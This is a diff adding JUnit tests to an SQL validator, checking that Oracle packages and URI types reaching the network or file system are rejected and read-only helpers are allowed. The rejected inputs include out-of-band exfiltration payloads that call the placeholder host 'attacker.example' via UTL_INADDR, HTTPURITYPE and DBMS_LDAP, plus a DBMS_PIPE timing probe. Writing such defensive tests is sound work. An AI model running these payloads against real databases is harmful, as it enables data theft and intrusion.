@@ -62,4 +62,29 @@ class SqlGuardTest {
     void rejectsEmptySql() {
         assertThrows(SqlValidationException.class, () -> guard.validate("  "));
     }
+
+    @ParameterizedTest
+    @DisplayName("Built-in packages and URI types that reach the network, file system or run jobs are rejected")
+    @ValueSource(strings = {
+            "SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.example') FROM dual",
+            "SELECT HTTPURITYPE('http://attacker.example/').GETCLOB() FROM dual",
+            "SELECT DBMS_LDAP.INIT('attacker.example', 389) FROM dual",
+            "SELECT DBMS_PIPE.RECEIVE_MESSAGE('p', 10) FROM dual",
+            "SELECT sys.DBMS_SQL.OPEN_CURSOR FROM dual",
+            "SELECT DBURITYPE('/SYS/DUAL').GETCLOB() FROM dual"
+    })
+    void rejectsSideEffectPackages(String sql) {
+        assertThrows(SqlValidationException.class, () -> guard.validate(sql));
+    }
+
+    @ParameterizedTest
+    @DisplayName("Read-only helper packages and look-alike identifiers are still allowed")
+    @ValueSource(strings = {
+            "SELECT DBMS_LOB.SUBSTR(notes, 100, 1) AS notes FROM customers",
+            "SELECT * FROM products ORDER BY DBMS_RANDOM.VALUE FETCH FIRST 5 ROWS ONLY",
+            "SELECT created_at, updated_by FROM orders"
+    })
+    void acceptsReadOnlyPackagesAndLookalikes(String sql) {
+        assertEquals(sql, guard.validate(sql));
+    }
 }
